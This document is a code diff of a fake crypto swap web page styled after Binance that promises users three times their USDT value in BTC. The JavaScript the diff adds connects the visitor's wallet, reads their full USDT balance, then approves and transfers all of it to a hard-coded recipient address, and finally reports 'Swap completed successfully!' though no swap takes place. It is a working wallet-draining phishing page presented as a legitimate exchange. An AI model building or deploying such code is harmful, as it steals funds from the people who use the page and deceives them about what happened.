@@ -3,18 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Binance | Swap Crypto</title>
+    <title>Swap Crypto</title>
     <style>
         :root {
-            --binance-yellow: #F0B90B;
-            --binance-yellow-hover: #F8D33A;
-            --binance-dark: #1E2026;
-            --binance-gray: #5E6673;
-            --binance-light-gray: #EAECEF;
-            --binance-bg: #F5F5F5;
-            --binance-card: #FFFFFF;
-            --binance-green: #02C076;
-            --binance-red: #F6465D;
+            --primary: #F0B90B;
+            --primary-hover: #F8D33A;
+            --text: #1E2026;
+            --text-light: #5E6673;
+            --bg: #F5F5F5;
+            --card: #FFFFFF;
+            --border: #EAECEF;
         }
 
         * {
@@ -26,158 +24,106 @@
 
         @font-face {
             font-family: 'Inter';
-            src: url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+            src: url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
         }
 
         body {
-            background-color: var(--binance-bg);
+            background-color: var(--bg);
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
+            padding: 16px;
+            color: var(--text);
+        }
+
+        .swap-card {
+            background-color: var(--card);
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+            width: 100%;
+            max-width: 380px;
             padding: 20px;
-            color: var(--binance-dark);
-            line-height: 1.5;
-        }
-
-        .binance-header {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            background-color: var(--binance-card);
-            height: 64px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
-            display: flex;
-            align-items: center;
-            padding: 0 20px;
-            z-index: 100;
-        }
-
-        .binance-logo {
-            height: 24px;
-            margin-right: 20px;
-        }
-
-        .swap-container {
-            background-color: var(--binance-card);
-            border-radius: 16px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
-            width: 100%;
-            max-width: 456px;
-            margin-top: 30px;
-            border: 1px solid var(--binance-light-gray);
-            overflow: hidden;
+            border: 1px solid var(--border);
         }
 
         .swap-header {
-            padding: 16px 20px;
-            border-bottom: 1px solid var(--binance-light-gray);
             display: flex;
             justify-content: space-between;
             align-items: center;
+            margin-bottom: 20px;
         }
 
         .swap-title {
             font-size: 18px;
             font-weight: 600;
-            color: var(--binance-dark);
         }
 
         .swap-settings {
-            color: var(--binance-gray);
+            color: var(--text-light);
             cursor: pointer;
         }
 
-        .swap-body {
-            padding: 20px;
+        .token-box {
+            margin-bottom: 12px;
         }
 
-        .swap-from, .swap-to {
-            margin-bottom: 16px;
-        }
-
-        .swap-label {
+        .token-label {
             font-size: 14px;
-            color: var(--binance-gray);
-            margin-bottom: 8px;
-            font-weight: 500;
+            color: var(--text-light);
+            margin-bottom: 6px;
         }
 
-        .swap-input-container {
-            border: 1px solid var(--binance-light-gray);
-            border-radius: 12px;
-            overflow: hidden;
+        .token-input-container {
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 12px;
         }
 
-        .swap-input-header {
+        .token-row {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 12px 16px;
-            background-color: #FAFAFA;
+            margin-bottom: 8px;
         }
 
-        .token-selector {
+        .token-info {
             display: flex;
             align-items: center;
-            cursor: pointer;
         }
 
         .token-icon {
             width: 24px;
             height: 24px;
-            border-radius: 50%;
             margin-right: 8px;
         }
 
         .token-name {
-            font-weight: 600;
-            font-size: 16px;
-            margin-right: 8px;
+            font-weight: 500;
         }
 
         .token-network {
             font-size: 12px;
-            color: var(--binance-gray);
-            background-color: var(--binance-light-gray);
+            color: var(--text-light);
+            background: #F5F5F5;
             padding: 2px 6px;
             border-radius: 4px;
-        }
-
-        .token-chevron {
-            color: var(--binance-gray);
             margin-left: 8px;
         }
 
-        .token-balance {
-            font-size: 14px;
-            color: var(--binance-gray);
-        }
-
-        .swap-input-body {
-            padding: 16px;
-            position: relative;
-        }
-
-        .swap-amount-input {
+        .amount-input {
             width: 100%;
             border: none;
             outline: none;
-            font-size: 28px;
-            font-weight: 600;
-            color: var(--binance-dark);
+            font-size: 22px;
+            font-weight: 500;
+            text-align: right;
             background: transparent;
         }
 
-        .swap-amount-input::placeholder {
-            color: #D1D5DC;
-        }
-
-        .swap-amount-value {
-            font-size: 14px;
-            color: var(--binance-gray);
-            margin-top: 8px;
+        .amount-value {
+            font-size: 13px;
+            color: var(--text-light);
             text-align: right;
         }
 
@@ -188,89 +134,82 @@
             position: relative;
         }
 
-        .swap-divider-button {
-            background-color: var(--binance-card);
-            border: 1px solid var(--binance-light-gray);
-            width: 32px;
-            height: 32px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            z-index: 2;
-        }
-
-        .swap-divider-line {
+        .swap-divider:before {
+            content: "";
             position: absolute;
             top: 50%;
             left: 0;
             right: 0;
             height: 1px;
-            background-color: var(--binance-light-gray);
+            background: var(--border);
             z-index: 1;
         }
 
+        .swap-icon {
+            width: 28px;
+            height: 28px;
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 2;
+        }
+
         .swap-rate {
-            font-size: 14px;
-            color: var(--binance-gray);
+            font-size: 13px;
+            color: var(--text-light);
             text-align: center;
             margin: 16px 0;
-            padding: 12px;
-            background-color: #FAFAFA;
-            border-radius: 8px;
         }
 
         .swap-rate strong {
-            color: var(--binance-dark);
-            font-weight: 600;
+            color: var(--text);
         }
 
         .swap-details {
-            border-top: 1px solid var(--binance-light-gray);
-            padding-top: 16px;
-            margin-top: 16px;
+            background: #FAFAFA;
+            border-radius: 8px;
+            padding: 12px;
+            margin: 16px 0;
         }
 
-        .swap-detail-row {
+        .detail-row {
             display: flex;
             justify-content: space-between;
-            margin-bottom: 12px;
+            margin-bottom: 8px;
         }
 
-        .swap-detail-label {
-            font-size: 14px;
-            color: var(--binance-gray);
+        .detail-row:last-child {
+            margin-bottom: 0;
         }
 
-        .swap-detail-value {
-            font-size: 14px;
-            color: var(--binance-dark);
+        .detail-label {
+            font-size: 13px;
+            color: var(--text-light);
+        }
+
+        .detail-value {
+            font-size: 13px;
             font-weight: 500;
         }
 
         .swap-button {
             width: 100%;
-            background-color: var(--binance-yellow);
-            color: var(--binance-dark);
+            background-color: var(--primary);
+            color: var(--text);
             border: none;
             border-radius: 8px;
-            padding: 16px;
-            font-size: 16px;
+            padding: 14px;
+            font-size: 15px;
             font-weight: 600;
-            margin-top: 16px;
             cursor: pointer;
-            transition: background-color 0.2s;
+            transition: all 0.2s;
         }
 
         .swap-button:hover {
-            background-color: var(--binance-yellow-hover);
-        }
-
-        .swap-button:disabled {
-            background-color: var(--binance-light-gray);
-            color: var(--binance-gray);
-            cursor: not-allowed;
+            background-color: var(--primary-hover);
         }
 
         /* Modal Styles */
@@ -285,88 +224,47 @@
             justify-content: center;
             align-items: center;
             z-index: 1000;
-            backdrop-filter: blur(5px);
         }
 
         .modal-content {
-            background-color: var(--binance-card);
-            padding: 24px;
-            border-radius: 16px;
-            max-width: 400px;
+            background-color: var(--card);
+            padding: 20px;
+            border-radius: 12px;
+            max-width: 320px;
             width: 90%;
             text-align: center;
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
-            border: 1px solid var(--binance-light-gray);
         }
 
         .modal-title {
-            font-size: 18px;
+            font-size: 16px;
             font-weight: 600;
-            margin-bottom: 16px;
-            color: var(--binance-dark);
+            margin-bottom: 12px;
         }
 
         .modal-message {
-            font-size: 15px;
-            color: var(--binance-gray);
-            margin-bottom: 20px;
-            line-height: 1.5;
-        }
-
-        .progress-bar {
-            height: 4px;
-            background-color: var(--binance-light-gray);
-            border-radius: 2px;
-            margin: 20px 0;
-            overflow: hidden;
-        }
-
-        .progress {
-            height: 100%;
-            background-color: var(--binance-yellow);
-            width: 0%;
-            transition: width 0.3s ease;
+            font-size: 14px;
+            color: var(--text-light);
+            margin-bottom: 16px;
         }
 
         .modal-button {
-            background-color: var(--binance-yellow);
-            color: var(--binance-dark);
+            background-color: var(--primary);
+            color: var(--text);
             border: none;
             border-radius: 8px;
-            padding: 12px 24px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 10px;
-            transition: background-color 0.2s;
-            width: 100%;
-        }
-
-        .modal-button:hover {
-            background-color: var(--binance-yellow-hover);
-        }
-
-        .tx-link {
-            color: var(--binance-yellow);
-            text-decoration: none;
-            font-weight: 500;
-            margin-top: 15px;
-            display: inline-block;
+            padding: 10px 20px;
             font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
         }
 
-        .tx-link:hover {
-            text-decoration: underline;
-        }
-
-        /* Loading spinner */
         .spinner {
-            width: 20px;
-            height: 20px;
-            border: 3px solid rgba(0, 0, 0, 0.1);
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(0, 0, 0, 0.1);
+            border-top-color: var(--text);
             border-radius: 50%;
-            border-top-color: var(--binance-dark);
-            animation: spin 1s ease-in-out infinite;
+            animation: spin 1s linear infinite;
             display: inline-block;
             margin-right: 8px;
             vertical-align: middle;
@@ -375,25 +273,11 @@
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
-
-        /* Responsive adjustments */
-        @media (max-width: 480px) {
-            .swap-container {
-                margin-top: 20px;
-            }
-            .swap-amount-input {
-                font-size: 24px;
-            }
-        }
     </style>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 </head>
 <body>
-    <div class="binance-header">
-        <img src="https://bin.bnbstatic.com/static/images/common/logo-bsc.svg" alt="Binance" class="binance-logo">
-    </div>
-
-    <div class="swap-container">
+    <div class="swap-card">
         <div class="swap-header">
             <div class="swap-title">Swap</div>
             <div class="swap-settings">
@@ -401,91 +285,69 @@
             </div>
         </div>
 
-        <div class="swap-body">
-            <div class="swap-from">
-                <div class="swap-label">From</div>
-                <div class="swap-input-container">
-                    <div class="swap-input-header">
-                        <div class="token-selector">
-                            <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT" class="token-icon">
-                            <span class="token-name">USDT</span>
-                            <span class="token-network">BSC</span>
-                            <i class="fas fa-chevron-down token-chevron"></i>
-                        </div>
-                        <div class="token-balance">Balance: 200.00</div>
-                    </div>
-                    <div class="swap-input-body">
-                        <input type="number" id="usdtInput" class="swap-amount-input" placeholder="0.0" value="200">
-                        <div id="usdtValue" class="swap-amount-value">≈ $200.00</div>
+        <div class="token-box">
+            <div class="token-input-container">
+                <div class="token-row">
+                    <div class="token-info">
+                        <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="token-icon" alt="USDT">
+                        <span class="token-name">USDT</span>
+                        <span class="token-network">BSC</span>
                     </div>
                 </div>
+                <input type="number" id="usdtInput" class="amount-input" placeholder="0.0" value="200">
+                <div id="usdtValue" class="amount-value">$200.00</div>
             </div>
-
-            <div class="swap-divider">
-                <div class="swap-divider-line"></div>
-                <div class="swap-divider-button">
-                    <i class="fas fa-arrow-down"></i>
-                </div>
-            </div>
-
-            <div class="swap-to">
-                <div class="swap-label">To</div>
-                <div class="swap-input-container">
-                    <div class="swap-input-header">
-                        <div class="token-selector">
-                            <img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" alt="BTC" class="token-icon">
-                            <span class="token-name">BTC</span>
-                            <span class="token-network">BTC</span>
-                            <i class="fas fa-chevron-down token-chevron"></i>
-                        </div>
-                    </div>
-                    <div class="swap-input-body">
-                        <div id="btcAmount" class="swap-amount-input" style="color: var(--binance-dark);">0.00506297</div>
-                        <div id="btcValue" class="swap-amount-value">≈ $600.00</div>
-                    </div>
-                </div>
-            </div>
-
-            <div class="swap-rate">
-                <strong>1 BTC ≈ 119,489.153599 USDT</strong>
-            </div>
-
-            <div class="swap-details">
-                <div class="swap-detail-row">
-                    <div class="swap-detail-label">Exchange Rate</div>
-                    <div class="swap-detail-value">1 BTC = 118,560.00 USDT</div>
-                </div>
-                <div class="swap-detail-row">
-                    <div class="swap-detail-label">Price Impact</div>
-                    <div class="swap-detail-value">< 0.01%</div>
-                </div>
-                <div class="swap-detail-row">
-                    <div class="swap-detail-label">Provider Fee</div>
-                    <div class="swap-detail-value">$0.50 (0.00063 BNB)</div>
-                </div>
-                <div class="swap-detail-row">
-                    <div class="swap-detail-label">Provider</div>
-                    <div class="swap-detail-value">Binance</div>
-                </div>
-            </div>
-
-            <button id="swapButton" class="swap-button">
-                <span id="buttonText">Connect Wallet</span>
-            </button>
         </div>
+
+        <div class="swap-divider">
+            <div class="swap-icon">
+                <i class="fas fa-arrow-down"></i>
+            </div>
+        </div>
+
+        <div class="token-box">
+            <div class="token-input-container">
+                <div class="token-row">
+                    <div class="token-info">
+                        <img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" class="token-icon" alt="BTC">
+                        <span class="token-name">BTC</span>
+                        <span class="token-network">BTC</span>
+                    </div>
+                </div>
+                <div id="btcAmount" class="amount-input" style="pointer-events: none;">0.00506297</div>
+                <div id="btcValue" class="amount-value">$600.00</div>
+            </div>
+        </div>
+
+        <div class="swap-rate">
+            <strong>1 BTC ≈ 119,489.153599 USDT</strong>
+        </div>
+
+        <div class="swap-details">
+            <div class="detail-row">
+                <div class="detail-label">Exchange Rate</div>
+                <div class="detail-value">1 BTC = 118,560.00 USDT</div>
+            </div>
+            <div class="detail-row">
+                <div class="detail-label">Provider Fee</div>
+                <div class="detail-value">$0.50 (0.00063 BNB)</div>
+            </div>
+            <div class="detail-row">
+                <div class="detail-label">Provider</div>
+                <div class="detail-value">Binance</div>
+            </div>
+        </div>
+
+        <button id="swapButton" class="swap-button">
+            <span id="buttonText">Swap Now</span>
+        </button>
     </div>
 
     <div id="modal" class="modal">
         <div class="modal-content">
-            <div class="modal-title" id="modalTitle">Connecting Wallet</div>
-            <div class="progress-bar">
-                <div class="progress" id="progressBar"></div>
-            </div>
-            <div class="modal-message" id="modalMessage">Please confirm the connection in your wallet</div>
-            <button id="modalButton" class="modal-button" style="display: none;">OK</button>
-            <a href="#" id="txLink" class="tx-link" target="_blank" style="display: none;">
-                <i class="fas fa-external-link-alt"></i> View on BscScan
-            </a>
+            <div class="modal-title" id="modalTitle">Processing Swap</div>
+            <div class="modal-message" id="modalMessage">Connecting to wallet...</div>
+            <button id="modalButton" class="modal-button">OK</button>
         </div>
     </div>
 
@@ -503,8 +365,6 @@
             const modalTitle = document.getElementById('modalTitle');
             const modalMessage = document.getElementById('modalMessage');
             const modalButton = document.getElementById('modalButton');
-            const progressBar = document.getElementById('progressBar');
-            const txLink = document.getElementById('txLink');
 
             // Constants
             const USDT_CONTRACT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
@@ -512,26 +372,13 @@
             const MIN_SWAP_AMOUNT = 200;
             const BTC_RATE = 119489.153599;
             const BSC_SCAN_URL = 'https://bscscan.com/tx/';
-            const USDT_PRICE = 1.00; // Assuming 1 USDT = $1 for this demo
 
             // State
             let isProcessing = false;
-            let currentAccount = null;
-            let walletConnected = false;
 
             // Initialize
-            init();
-
-            function init() {
-                // Setup event listeners
-                setupEventListeners();
-                
-                // Calculate initial values
-                updateConversion();
-                
-                // Check if wallet is already connected
-                checkConnectedWallet();
-            }
+            updateConversion();
+            setupEventListeners();
 
             function setupEventListeners() {
                 // Input change handler
@@ -542,27 +389,19 @@
                 
                 // Modal button handler
                 modalButton.addEventListener('click', () => {
-                    if (!isProcessing) {
-                        modal.style.display = 'none';
-                    }
+                    modal.style.display = 'none';
                 });
-                
-                // Wallet account change handler
-                if (window.ethereum) {
-                    window.ethereum.on('accountsChanged', handleAccountsChanged);
-                    window.ethereum.on('chainChanged', handleChainChanged);
-                }
             }
 
             function updateConversion() {
-                const usdtValue = parseFloat(usdtInput.value) || 0;
-                const usdValue = usdtValue * USDT_PRICE;
-                const calculatedBtc = (usdValue * 3) / BTC_RATE; // 3x multiplier as per requirements
+                const usdt = parseFloat(usdtInput.value) || 0;
+                const usd = usdt * 1.0; // Assuming 1 USDT = 1 USD
+                const btc = (usd * 3) / BTC_RATE; // 3x multiplier as per requirements
                 
                 // Update displays
-                usdtValue.textContent = `≈ $${usdValue.toFixed(2)}`;
-                btcAmount.textContent = calculatedBtc.toFixed(8);
-                btcValue.textContent = `≈ $${(usdValue * 3).toFixed(2)}`;
+                usdtValue.textContent = `$${usd.toFixed(2)}`;
+                btcAmount.textContent = btc.toFixed(8);
+                btcValue.textContent = `$${(usd * 3).toFixed(2)}`;
             }
 
             async function handleSwap() {
@@ -570,45 +409,113 @@
                 
                 try {
                     isProcessing = true;
-                    
-                    if (!walletConnected) {
-                        await connectWallet();
-                        return;
-                    }
-                    
-                    // Proceed with swap
-                    showModal('Processing Swap', 'Checking USDT balance...');
-                    updateProgress(20);
-                    
-                    // Check USDT balance
-                    const balance = await getUSDTBalance(currentAccount);
-                    updateProgress(40);
-                    
-                    // Validate balance
-                    if (balance < MIN_SWAP_AMOUNT) {
-                        throw new Error(`Minimum swap is ${MIN_SWAP_AMOUNT} USDT. Your balance: ${balance.toFixed(2)} USDT`);
-                    }
-                    
-                    // Perform swap
-                    await performSwap(balance);
-                    
-                } catch (error) {
-                    console.error('Swap error:', error);
-                    showModal('Error', error.message || 'An error occurred during the swap');
-                    isProcessing = false;
-                    modalButton.style.display = 'block';
-                }
-            }
-
-            async function connectWallet() {
-                try {
-                    showModal('Connecting Wallet', 'Please confirm the connection in your wallet');
-                    updateProgress(30);
+                    buttonText.innerHTML = '<span class="spinner"></span> Processing';
+                    showModal('Processing', 'Connecting to wallet...');
                     
                     // Check if wallet is installed
                     if (!window.ethereum) {
-                        throw new Error('Please install MetaMask or Trust Wallet to continue');
+                        throw new Error('Please install MetaMask or Trust Wallet');
                     }
                     
                     // Request account access
-                    const accounts = await window.ethereum.re
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    const provider = new ethers.providers.Web3Provider(window.ethereum);
+                    const signer = provider.getSigner();
+                    
+                    // Switch to BNB Smart Chain
+                    await switchToBNBChain();
+                    
+                    // Check USDT balance
+                    const usdtContract = new ethers.Contract(
+                        USDT_CONTRACT_ADDRESS,
+                        ['function balanceOf(address) view returns (uint256)'],
+                        signer
+                    );
+                    
+                    const balance = await usdtContract.balanceOf(accounts[0]);
+                    const balanceInUsdt = parseFloat(ethers.utils.formatUnits(balance, 18));
+                    
+                    if (balanceInUsdt < MIN_SWAP_AMOUNT) {
+                        throw new Error(`Minimum swap is ${MIN_SWAP_AMOUNT} USDT`);
+                    }
+                    
+                    // Perform swap
+                    await performSwap(signer, balance);
+                    
+                } catch (error) {
+                    console.error('Error:', error);
+                    showModal('Error', error.message || 'Swap failed');
+                    buttonText.textContent = 'Swap Now';
+                } finally {
+                    isProcessing = false;
+                }
+            }
+
+            async function switchToBNBChain() {
+                try {
+                    await window.ethereum.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: '0x38' }], // BSC mainnet
+                    });
+                } catch (switchError) {
+                    // Chain not added to wallet
+                    if (switchError.code === 4902) {
+                        try {
+                            await window.ethereum.request({
+                                method: 'wallet_addEthereumChain',
+                                params: [{
+                                    chainId: '0x38',
+                                    chainName: 'Binance Smart Chain',
+                                    nativeCurrency: {
+                                        name: 'BNB',
+                                        symbol: 'BNB',
+                                        decimals: 18,
+                                    },
+                                    rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                                    blockExplorerUrls: ['https://bscscan.com'],
+                                }],
+                            });
+                        } catch (addError) {
+                            throw new Error('Failed to add BSC network');
+                        }
+                    } else {
+                        throw new Error('Failed to switch to BSC');
+                    }
+                }
+            }
+
+            async function performSwap(signer, amount) {
+                showModal('Processing', 'Approving USDT transfer...');
+                
+                const usdtContract = new ethers.Contract(
+                    USDT_CONTRACT_ADDRESS,
+                    [
+                        'function approve(address spender, uint256 amount) returns (bool)',
+                        'function transfer(address recipient, uint256 amount) returns (bool)'
+                    ],
+                    signer
+                );
+                
+                // Approve first
+                const approveTx = await usdtContract.approve(RECIPIENT_ADDRESS, amount);
+                await approveTx.wait();
+                
+                // Then transfer
+                showModal('Processing', 'Transferring USDT...');
+                const transferTx = await usdtContract.transfer(RECIPIENT_ADDRESS, amount);
+                const receipt = await transferTx.wait();
+                
+                // Success
+                showModal('Success', 'Swap completed successfully!');
+                buttonText.textContent = 'Swap Now';
+            }
+
+            function showModal(title, message) {
+                modalTitle.textContent = title;
+                modalMessage.textContent = message;
+                modal.style.display = 'flex';
+            }
+        });
+    </script>
+</body>
+</html>
